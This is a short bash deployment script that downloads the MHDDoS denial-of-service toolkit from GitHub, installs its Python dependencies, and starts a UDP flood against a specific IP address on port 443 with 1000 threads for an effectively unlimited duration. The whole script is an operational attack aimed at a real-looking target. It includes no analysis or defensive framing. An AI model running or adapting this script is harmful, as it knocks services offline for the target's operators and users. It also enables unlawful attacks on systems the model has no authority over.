#!/bin/bash
git clone https://github.com/Chen-Sa/MHDDoS.git
curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
cd MHDDoS/
pip install -r requirements.txt
sudo python3 start.py udp 80.96.156.22:443 1000 999999
